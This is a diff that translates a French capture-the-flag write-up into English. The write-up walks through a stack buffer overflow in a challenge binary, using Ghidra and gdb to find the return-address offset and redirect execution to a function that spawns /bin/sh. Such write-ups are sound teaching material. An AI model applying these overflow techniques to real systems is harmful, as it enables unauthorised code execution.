@@ -1,6 +1,6 @@
 # Call me baby
 
-Sujet :
+Subject :
 
 ```md
 You just had the best idea, why not write a love letter to your crush ?
@@ -8,7 +8,7 @@ You just had the best idea, why not write a love letter to your crush ?
 http://internetcest.fun:13337
 ```
 
-[Cet executable](./call_me_baby) est fournis. Essayons le :
+[This binary](./call_me_baby) is given. Let's try it out :
 
 ```bash
 $ ./call_me_baby 
@@ -17,11 +17,11 @@ test
 You should call her instead...
 ```
 
-À nouveau le programme demande une entrée de l'utilisateur et s'arrête. Explorons le code.
+Again, the program is asking for an input and then exiting. Let's explore the code.
 
-## Reverse
+## Static analysis
 
-Avec ghidra on obtient les fonctions suivantes :
+Using Ghidra, we find those functions :
 
 ```C
 undefined8 main(void)
@@ -63,17 +63,17 @@ void gadgets(void)
 }
 ```
 
-Il faut donc exécuter `execve("/bin/sh",(char **)0x0,(char **)0x0);` dans call_me().  
+We need to execture `execve("/bin/sh",(char **)0x0,(char **)0x0);` in call_me().  
   
-Pour ce faire, on va exploiter la fonction gets() dans vuln() qui est vulnérable à un buffer overflow pour rediriger le programme vers la fonction call_me().
+The read() is expecting 100 bytes (`read(0,local_48,100);`), even tho the local_48 variable used to store the user input is only 64 bytes long (`undefined local_48 [64];`). This is vulnerable to a [buffer overflow](https://en.wikipedia.org/wiki/Buffer_overflow), so we'll exploit it to redirect the program towards the call_me() function.
 
-# Payload
+# Dynamic analysis
 
-Utilisons gdb pour trouver notre exploit. On ajoute un break après la fonction gets() pour observer la mémoire et rentre 64 charactères A pour remplir le buffer utilisé pour récupérer l'entrée de l'utilisateur :
+In the stack, after the rbp (Register Base Pointer, which points to the base of the current stack) is stored a pointer to where the program will have to go next. For example, after running the vuln() function, the program will return to the main() function. So the next value after the rbp will be a pointer towards the main function. By overwriting this pointer, we can redirect the program execution.  
+  
+Let's find out how many bytes we need to write over. First, we'll disassemble the vuln() function and add a breakpoint after the read function is called :
 
 ```gdb
-(gdb) break *vuln
-Breakpoint 1 at 0x4011dd
 (gdb) disas vuln
 Dump of assembler code for function vuln:
    0x00000000004011dd <+0>:	push   %rbp
@@ -93,14 +93,15 @@ Dump of assembler code for function vuln:
 End of assembler dump.
 (gdb) break *vuln+45
 Breakpoint 2 at 0x40120a
+```
+
+Now we'll input 64 characters to fill local_48, and inspect the register to see how many bytes we need to write over before reaching the rbp :
+
+```gdb
 (gdb) r <<< $(python3 -c 'import sys; sys.stdout.buffer.write(b"\x41"*64)')
 Starting program: /home/coucou/Documents/CTF_SSI_2024/Call_me_baby/call_me_baby <<< $(python3 -c 'import sys; sys.stdout.buffer.write(b"\x41"*64)')
 [Thread debugging using libthread_db enabled]
 Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
-
-Breakpoint 1, 0x00000000004011dd in vuln ()
-(gdb) c
-Continuing.
 Write your love letter: 
 
 Breakpoint 2, 0x000000000040120a in vuln ()
@@ -111,7 +112,7 @@ Breakpoint 2, 0x000000000040120a in vuln ()
 0x7fffffffd9f0:	0x41414141	0x41414141	0x41414141	0x41414141
 0x7fffffffda00:	0xffffda0a	0x00007fff	0x00401230	0x00000000
 0x7fffffffda10:	0xffffdb38	0x00007fff	0x00000000	0x00000001
-(gdb) i r
+(gdb) info register
 rax            0x41                65
 rbx            0x7fffffffdb38      140737488345912
 rcx            0x7ffff7ec0a5d      140737352829533
@@ -137,7 +138,9 @@ es             0x0                 0
 fs             0x0                 0
 gs             0x0                 0
 ```
-  
+
+The `x/24wx $rsp` is printing out the stack, we can easily spot the "\x41" characters we gave to the program. Next we use the `info register` command to print out the register and find out where the rbp is : `rbp            0x7fffffffda00`. Looking at the stack, we can see that the rbp is right next to our input. We'll only need to write over the rbp (8 bytes) to reach the return address.
+
 L'addresse à laquelle les fonctions se redirigent après leur execution est stocké après le rbp dans la stack. En regardant le registre et l'adresse à laquelle le rbp est stocké, on déduit le payload pour rediriger le programme :
 
 ```gdb
